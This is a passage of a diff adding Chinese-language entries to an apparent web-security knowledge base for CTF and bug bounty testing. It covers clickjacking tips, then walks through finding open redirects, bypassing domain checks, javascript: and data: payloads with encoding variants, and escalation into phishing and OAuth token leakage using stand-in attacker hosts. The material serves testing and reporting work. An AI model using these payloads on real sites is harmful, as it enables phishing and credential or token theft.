z-index:10，按钮设 z-index:20 |\n| 目标页在 iframe 里位置乱跳 | 页面有滚动/懒加载 | 精确设置 iframe 宽高，onload 后定位再取坐标 |\n| 点中但操作未生效 | 该操作需要确认弹窗/token | 换一个无确认的按钮，或与 CSRF 思路组合（见 g-csrf） |\n\n#### 实战要点\n- 判定三连：`X-Frame-Options` 缺失、CSP `frame-ancestors` 缺失、两者都无 → 可嵌。任何一个存在都先视为不可利用。\n- 优先选\"点击即生效、无二次确认\"的按钮（删除、转账、发布），成功率最高。\n- 高级变体：拖拽型点击劫持（drag-and-drop clickjacking）用多个 iframe 拼接指针轨迹；同源页面可在 iframe 里先执行 JS 读取 CSRF token，再配合诱饵提交，绕过 token 校验。\n- CTF 中点击劫持几乎总是与 CSRF 组合命题：iframe 内先读 token（同源可读），再骗点击提交带 token 的请求。\n- 报告写危害时不要单报\"可被点击劫持\"，要写\"可诱导用户完成 X 操作\"，结合目标按钮的实际功能定性。"
+        }
+      ]
+    },
+    {
+      "id": "g-redirect",
+      "name": "开放重定向与跳转",
+      "intro": "跳转参数未校验目标即开放重定向，可被用于钓鱼、token 泄露与 XSS 升级，常被低估",
+      "entries": [
+        {
+          "id": "redirect-param-find",
+          "title": "跳转参数挖掘",
+          "tags": [
+            "redirect",
+            "parameter",
+            "param"
+          ],
+          "aliases": [
+            "跳转参数"
+          ],
+          "difficulty": "easy",
+          "summary": "先找到\"哪些参数决定跳转去向\"，再判断是否校验了协议/域名。登录、登出、支付回跳、第三方回调都是重灾区。",
+          "content": "\n#### 这个条目的作用\n开放重定向（Open Redirect）的第一步永远是\"找到那个决定跳转去向的参数\"。很多站点登录成功后要跳回用户之前浏览的页面，于是有了 `?redirect=...`、`?next=...` 这类回跳参数；如果服务端没校验跳转目标，攻击者就能让受害者跳去钓鱼站。本节教你怎么从零找到跳转参数、验证漏洞成立，以及常见校验的绕过姿势。\n\n#### 前置条件\n- 目标站点一个普通账号（用于触发登录/登出等流程）\n- 浏览器开发者工具（F12 → Network 面板），能看清每个请求的完整 URL\n- 一个你自己的可访问域名（没有就用 `http://attacker.com` 占位，验证跳转只看 Location 头即可）\n\n#### 第 1 步：列出站内所有\"回跳\"场景\n开放重定向重灾区按优先级排序：登录成功回跳、登出回跳、SSO/单点登录回跳、支付完成回跳、第三方 OAuth 回调、分享/预览页面。在浏览器里逐个触发这些流程，同时打开 Network 面板。预期结果：看到类似这样的请求：\n```http\nGET /login?redirect=/dashboard HTTP/1.1\nGET /logout?next=/ HTTP/1.1\nGET /sso/callback?redirect_uri=https://app.com/cb HTTP/1.1\n```\n这些带 `redirect` / `next` / `redirect_uri` 之类参数的请求就是候选注入点。如果不行（一个都找不到）：直接跳到第 5 步用参数名字典批量猜。\n\n#### 第 2 步：确认参数确实控制跳转\n把参数值改成站内另一个路径，例如把 `redirect=/dashboard` 改成 `redirect=/profile`，回车访问。预期结果：登录/登出后浏览器最终落在 `/profile`，证明该参数确实决定去向。如果不行（还是跳回原页面）：可能参数名猜错，或该参数只在特定流程生效（必须真实走完登录流程），回到第 1 步从真实流量里抄参数名。\n\n#### 第 3 步：换成外域测试是否校验\n把参数值改为 `https://attacker.com`：\n```txt\nhttps://target.com/login?redirect=https://attacker.com\n```\n预期结果（漏洞成立）：浏览器最终跳转到 `attacker.com`——Network 面板里能看到一条 302，Location 头就是 `https://attacker.com`。如果不行（还是跳回 target.com）：说明有域名校验，进入第 4 步与第 5 步尝试绕过。\n\n#### 第 4 步：绕域名校验的经典变体\n常见的\"半吊子\"校验是**前缀包含**（正则里写了 `^https://target.com` 或 `startsWith`），这类校验一打就穿：\n```txt\nhttps://target.com.attacker.com          # 子域名伪造\nhttps://target.com@attacker.com          # @ 前是用户名，浏览器实际去 attacker.com\nhttps://target.com.evil.net/             # 前缀看起来是 target.com\n//attacker.com                           # 协议相对 URL，继承当前协议，可绕过\"必须 http(s)\"的协议校验\nhttps://attacker.com?u=https://target.com  # 参数里含 target.com，骗过\"包含\"型校验\n```\n逐个尝试，看到 302 的 Location 指向外域即为绕过成功。如果不行：说明是精确白名单（域名表比对），单靠这一个参数打不动，转到第 5 步看有没有二次跳转链路。\n\n#### 第 5 步：批量枚举参数名（找不到跳转参数时）\n用下面的参数名字典，对目标站任意一个带重定向功能的入口逐个替换测试：\n```txt\nurl redirect next target return next_url jump go u dest\nredirect_url redirect_uri callback continue retUrl back rurl\n```\n快速办法：用浏览器控制台对每个候选名发请求，观察响应是否出现 302 且 Location 跟随注入的值；也可以把抓到的真实回跳参数做同义替换（如 `redirect` → `url`），很多站点后端会同时接收多个别名。\n\n#### 第 6 步：判定与记录\n漏洞成立的完整证据链：① 触发真实流程（登录/登出）→ ② 请求里带回跳参数 → ③ 参数值改为外域后 302 Location 指向外域 → ④ 浏览器实际到达外域。把这四步的请求与响应截图保存。若参数只放行 http(s) 但校验可绕过，漏洞定性为\"开放重定向\"；若还能注入 `javascript:`（见 redirect-pseudo-protocol 条目），定性直接升级为 XSS。\n\n> [!warn]\n> 只放行同域前缀但允许\"包含关系\"的校验是经典缺陷：`https://target.com.attacker.com` 与 `https://attacker.com?u=https://target.com` 经常能绕过\"必须以 target.com 开头\"的正则。测跳转参数时这四个变体（子域、@、//、参数内含域名）必须全试。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 改了参数还是跳回原页 | 参数名猜错，或校验拦截 | 从 Network 抓真实回跳请求抄参数名，逐字核对 |\n| 只有 302 但浏览器没去外域 | 服务端跳转后又有一层前端 JS 重定向 | 看响应体/JS 里是否有二次 `location.href` 拼接 |\n| `//attacker.com` 不生效 | 目标强制 https，或协议白名单拦截 | 换 `https://attacker.com` 或 `http://attacker.com` 重试 |\n| 子域变体跳了但纯外域不跳 | 校验是\"前缀包含 target.com\" | 直接利用 `target.com.attacker.com` 这个形态 |\n| 参数在 POST body 里 | 回跳参数不止出现在 URL | 用表单/重放工具对 POST 参数同样测一遍 |\n\n#### 实战要点\n- 重灾区固定清单：登录、登出、SSO、支付回跳、OAuth 回调——测目标时先扫这五类入口。\n- 跳转参数的价值不取决于参数名，而取决于\"是否校验\"；先证明可控，再谈危害。\n- 绕校验四件套：子域伪造、`@` 用户名混淆、协议相对 `//`、参数内包含目标域名。\n- 找到开放重定向后不要停：若该参数驱动的是前端 `location.href` / `window.open`，立刻测 `javascript:` 协议（见 redirect-pseudo-protocol）；若存在二次跳转链路，可串联绕过白名单（见 redirect-harm-upgrade）。\n- 报告里开放重定向单独定性通常为低危，务必继续做危害升级（钓鱼 / token 泄露 / XSS）再提交。"
+        },
+        {
+          "id": "redirect-pseudo-protocol",
+          "title": "伪协议与 javascript: 变体",
+          "tags": [
+            "redirect",
+            "javascript",
+            "xss",
+            "protocol"
+          ],
+          "aliases": [
+            "伪协议"
+          ],
+          "difficulty": "hard",
+          "summary": "跳转参数若未限制协议，`javascript:` 直接把开放重定向升级为同源 XSS；`data:` 也是一条协议层面的绕过路径。",
+          "content": "\n#### 这个条目的作用\n开放重定向升级成 XSS 的分水岭就是\"协议校验\"。跳转参数最终要被浏览器导航，如果服务端只拦域名不拦协议，`javascript:` 伪协议会让浏览器**在目标站同源上下文里执行脚本**——这等于一个不需要闭合引号、不需要构造标签的 XSS。本节讲清 `javascript:` 在哪种跳转形态下能触发、哪些变体能绕过关键字过滤，以及 `data:` 的利用方式。\n\n#### 前置条件\n- 已按 redirect-param-find 找到一个可控跳转参数（参数值能影响最终跳转去向）\n- 分清目标跳转的\"层级\"：服务端 302（Location 头）还是前端 JS 跳转（`location.href` / `window.open` / `<a href>` 渲染）\n- 浏览器开发者工具，能看响应头与执行 JS\n\n#### 第 1 步：先确认跳转发生的层级\n看跳转是服务端做的还是前端做的：\n```txt\n服务端 302: 响应是 3xx + Location 头，浏览器按头导航\n前端跳转: 响应 200，页面 JS 里 location.href = 参数 / window.open(参数) / <a href=参数>\n```\n这一步决定后续 payload 能不能生效：`javascript:` 只在**前端跳转**里可靠执行——`location.href` 赋值、`window.open()`、`<a href>` 渲染返回值时。如果不行（是服务端 302）：服务端把 `javascript:` 写进 Location 头时现代浏览器通常直接拒绝导航，此参数大概率只能做普通开放重定向，转去做钓鱼/危害升级（见 redirect-harm-upgrade）。\n\n> [!danger]\n> 判定铁律：跳转参数驱动 `location.href`/`window.open` 且未校验协议时，必然同时测 `javascript:`；即便服务端只放行 http(s)，若前端代码是 `location.href = 'https://' + param`，仍可尝试 `/attacker.com` 配合 `\\` 或 `@` 混淆。\n\n#### 第 2 步：直接注入 javascript: 验证执行\n把跳转参数改为：\n```txt\nhttps://target.com/redirect?url=javascript:alert(document.domain)\n```\n预期结果：弹窗显示 `target.com`——注意弹的是**目标站域名**，说明脚本在目标站同源上下文执行，这就是同源 XSS。如果不行（没弹窗）：检查跳转层级（回到第 1 步）或是否被过滤（进入第 3 步）。验证时建议用 `alert(document.domain)` 而非 `alert(1)`，弹窗内容直接证明同源，报告里更好写。\n\n#### 第 3 步：过滤了 javascript: 时的变体\n若 `javascript:` 被过滤，按注入上下文选变体。href 属性 / 前端拼接场景用大小写与 HTML 实体：\n```html\nJaVaScRiPt:alert(1)\njavascript&#58;alert(1)        <!-- HTML 实体冒号 -->\njavascript&colon;alert(1)\n&#0000106;avascript:alert(1)   <!-- 十进制实体 -->\n```\nJS 字符串场景（`window.open` / `location.href` 赋值，服务端不转义时）用 JS 转义：\n```javascript\njavascript:\\u0061lert(1)\n\\u006a\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074:alert(1)\n\\ud6a5cript:alert(1)           <!-- window.open/location 赋值场景的编码变体 -->\n```\n预期结果：变体被浏览器解码后仍以 `javascript:` 协议执行。如果不行：过滤在协议白名单层面（枚举只有 http/https），这些变体也过不去 → 该参数降级为开放重定向，转 redirect-harm-upgrade 找组合利用。\n\n> [!warn]\n> 编码只在**能被浏览器解码的那个层**有效。HTML 实体（`&#58;`）只在 HTML 属性上下文（如 `<a href>`）被解析；事件属性/JS 上下文里要用 JS 转义（`\\u0061`）。先确认参数最终落在哪个上下文，再选编码层。\n\n#### 第 4 步：测试 data: 协议\n`data:` 协议在部分跳转实现里同样能带来脚本执行或任意 HTML 内容：\n```txt\nhttps://target.com/redirect?url=data:text/html,<script>alert(1)</script>\n```\n预期结果：浏览器导航到 data: 页面。注意 data: 页面是**独立来源**（opaque origin），`document.domain` 是空值——它主要用于证明\"协议校验缺失\"和展示可注入任意 HTML 内容。如果不行：浏览器对顶层 data: 导航有限制，该参数对 data: 免疫，不影响 javascript: 的结论。\n\n#### 第 5 步：区分两种漏洞定性\n用一张判定表收尾：\n```txt\n仅允许 http/https 的跳转参数 -> 开放重定向（钓鱼/凭据窃取）\n允许 javascript: 的跳转参数 -> 直接 XSS（同源，危害翻倍）\n```\n同一参数的测试记录要保留：原始注入、变体、最终触发形态。报告里明确写\"跳转参数未校验协议，可注入 javascript: 执行同源脚本\"，危害等级按 XSS 定，而不是按开放重定向定。\n\n#### 第 6 步：与开放重定向结论合并归档\n把本条的结论挂回 redirect-param-find 的测试结果：哪个参数、哪种跳转形态（服务端/前端）、哪些协议被放行。若前端拼接是 `location.href = 'https://' + param`，记下 `//` + `@` 混淆的测试结果。归档后这条链可以直接作为 redirect-harm-upgrade 里的 XSS 升级案例。\n\n> [!tip]\n> 测协议白名单的最快顺序：先 `javascript:alert(1)` → 被拦再上大小写/实体/JS 转义 → 全拦则测 `data:` → 全拦再退到\"域名校验\"层面测开放重定向。一把梭不要卡在某一层。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| javascript: 注入后没弹窗 | 跳转是服务端 302，Location 里的 javascript: 被浏览器拒绝 | 改测前端跳转参数，或接受\"仅开放重定向\"结论 |\n| 弹窗内容不是目标域名 | 落到了 data: 等独立来源 | 换 `alert(document.domain)` 并在目标页面上下文验证 |\n| 实体变体不生效 | 参数最终进的是 JS 上下文而非 HTML 属性 | 换 `\\u0061` 形式的 JS 转义变体 |\n| 所有变体都被拦 | 服务端协议白名单过滤 | 该参数降级为开放重定向，转组合利用 |\n| 前端拼接了固定前缀 https:// | 域名校验看的是完整字符串 | 试 `//attacker.com`、`/attacker.com`、`@` 混淆 |\n\n#### 实战要点\n- `javascript:` 只在客户端跳转（location.href / window.open / href 渲染）可靠触发，服务端 302 基本免疫——先分层级再选 payload。\n- 验证用 `alert(document.domain)`，弹窗内容即同源证据，报告一句话讲清危害。\n- 变体按上下文选：HTML 属性用实体，JS 上下文用 `\\u` 转义，别混用。\n- 协议放行与域名放行是两套校验，分别测试：协议不过还能退到域名层面的开放重定向。\n- CTF 里\"跳转参数 + javascript:\"是最常见组合命题，先测协议再测域名，基本一把梭。\n- 报告定级：允许 javascript: 的参数按 XSS 报，别按开放重定向报低了自己。"
+        },
+        {
+          "id": "redirect-harm-upgrade",
+          "title": "危害升级与组合利用",
+          "tags": [
+            "redirect",
+            "phishing",
+            "token",
+            "xss"
+          ],
+          "aliases": [
+            "重定向危害"
+          ],
+          "difficulty": "medium",
+          "summary": "开放重定向自身通常不评高危，但叠加钓鱼、token 泄露与 XSS 后可升级为认证绕过或会话劫持，报告价值随之上升。",
+          "content": "\n#### 这个条目的作用\n开放重定向单独提交往往被降为低危，但它是极好的\"杠杆\"：叠上钓鱼页、OAuth token 泄露、XSS 之后，整条链能升级到中高危甚至会话劫持。本节教你三条标准升级路径（钓鱼、token 泄露、XSS），以及怎么把多个漏洞串成一条报告价值更高的攻击链。\n\n#### 前置条件\n- 已按 redirect-param-find 确认一个开放重定向（参数可控且至少放行 http/https）\n- 了解目标站的登录/SSO/OAuth 流程（用于找 token 泄露点）\n- 浏览器开发者工具 + 一个能接收请求的测试端点（没有就用 `http://attacker.com/` 占位观察跳转目标）\n\n#### 第 1 步：确认基础开放重定向仍然成立\n先回放 redirect-param-find 的验证：改参数为 `https://attacker.com`，确认 302/前端跳转仍指向外域。这是所有升级链的地基，地基不牢后面全是白测。顺手测一下域名校验的强度（子域、@、// 变体哪个能过），后面构造链式 payload 要用。\n\n#### 第 2 步：升级路径一——钓鱼\n构造一个\"看起来像目标站\"的 URL 发给受害者：\n```txt\nhttps://target.com/login?redirect=https://target.com.evil.net/phish\n```\n受害者先看到的是 `target.com` 开头的正规域名，跳转后落在 `target.com.evil.net`（攻击者可控）的钓鱼登录页，输入的账号密码直接进攻击者手里。预期结果：浏览器实际到达攻击者域名，且 URL 前缀在肉眼层面与目标站高度相似。如果不行（目标校验严格，精确白名单）：这条路径换用第 3 步的 token 路径，或找二次跳转（第 5 步）。\n\n> [!warn]\n> 钓鱼页要复刻目标登录页结构，这是展示环节；漏洞本身成立与否只看\"能否跳转到攻击者域名\"，钓鱼页只是把危害讲清楚的道具。\n\n#### 第 3 步：升级路径二——OAuth/SSO token 泄露\n找目标站接入的 OAuth/SSO 登录入口，观察授权回调请求：\n```txt\n登录流程: target 授权 -> 302 到 redirect_uri?code=xxxx\n```\n测试回调参数校验强度：\n```txt\n错误校验: 只比对 redirect_uri 前缀/允许通配符 ->\n攻击: redirect_uri=https://attacker.com/cb+target.com 形式的混淆\n     或先传合法 redirect_uri 拿 code, 再用开放重定向把 code 带出去\n```\n预期结果（漏洞成立）：`code`/`token` 随回调请求发往攻击者控制的地址，或经开放重定向转跳时通过 Referer / 拼接 URL 外泄。如果不行：回调参数是精确匹配，且 code 与 redirect_uri 强绑定 → 尝试先拿 code 再二次跳转带出（见第 5 步）。注意：code 通常一次性且与 redirect_uri 绑定，报告里写\"可截获一次性授权码，配合回调参数缺陷可完成登录劫持\"即可，不必真完成整条链。\n\n#### 第 4 步：升级路径三——XSS 升级\n若跳转参数驱动前端跳转且协议未校验（见 redirect-pseudo-protocol），直接注入：\n```txt\nhttps://target.com/redirect?url=javascript:alert(document.domain)\n```\n这已经不是\"升级\"，而是把漏洞定性整体换成同源 XSS。若协议被拦，还有一类弱化升级：跳转参数被拼进前端 DOM 时，利用 `//attacker.com` 配合引号闭合尝试 DOM 注入。预期结果：弹窗显示 target.com 域名 → 按 XSS 报。如果不行（协议、拼接都拦）：维持开放重定向定性，叠加第 2、3 步的钓鱼/token 路径。\n\n#### 第 5 步：二次跳转串联绕过白名单\n服务端若有\"跳转再跳转\"链路（参数 A 跳到一个同样带跳转参数的页面），可串联两次开放重定向绕过域名白名单：\n```txt\n第一跳: /redirect?url=/another-redirect?url=https://attacker.com\n第二跳: /another-redirect?url=... 未校验 -> 最终到 attacker.com\n```\n预期结果：两次跳转的中间页面都在目标域内，但最终落在外域，绕过\"首跳参数必须同域\"的校验。如果不行：目标没有二次跳转入口 → 跳过此步，用前三条路径收尾。\n\n#### 第 6 步：与 XSS/CSRF 组合成链并定级\n有开放重定向 + 任一一处 XSS/CSRF 时，可以拼成一条自动触发的链：\n```html\n<script>\nlocation='https://target.com/logout?redirect=//attacker.com/phish'\n</script>\n```\n这条链借助 XSS/CSRF 先让受害者退出登录或触发某操作，再借开放重定向把受害者送往钓鱼页。报告按链式危害定性：\n```txt\n开放重定向（低）-> token 泄露/钓鱼（中高）-> 与 XSS 组合成会话劫持（高）\n```\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 钓鱼链只在部分浏览器生效 | 浏览器对跨域顶层导航的 Referer 策略不同 | 链内显式跳转，不依赖 Referer 自动携带 |\n| code 拿到了但没法用 | 授权码一次性/与 redirect_uri 强绑定 | 报告写\"可截获\"，不强行完成登录劫持 |\n| 二次跳转的第二跳不跳 | 第二层也做校验 | 换第二跳的变体（子域/@///）再试 |\n| javascript: 被拦导致 XSS 路径断 | 协议白名单 | 退回钓鱼/token 路径，或测 data: 与拼接注入 |\n| 报告只写\"开放重定向\"被降危 | 没做危害升级 | 按第 2-4 步至少补齐一条升级链再提交 |\n\n#### 实战要点\n- 三条升级路径独立成立：钓鱼（域名相似）、token 泄露（OAuth 回调）、XSS（javascript:），互不依赖，测完基础重定向就逐条跑。\n- OAuth/SSO 的回调参数（redirect_uri）是 token 泄露高发点：前缀匹配、通配符、编码混淆都是经典缺陷。\n- 报告按链式危害写：开放重定向（低）→ token 泄露/钓鱼（中高）→ 与 XSS 组合成会话劫持（高），定性随链升级。\n- 二次跳转（跳转再跳转）可串联两次开放重定向绕过域名白名单，白名单严格的站先找这个入口。\n- CTF 中\"跳转参数 + javascript:\"是最常见命题，先测协议再测域名；真实 SRC 中优先找 OAuth 回调与登录回跳。\n- 留全证据：每一跳的请求/响应、Location 头、以及最终到达的域名，链式报告必须能让人按图索骥复现。"
+        }
+      ]
+    }
+  ]
+}
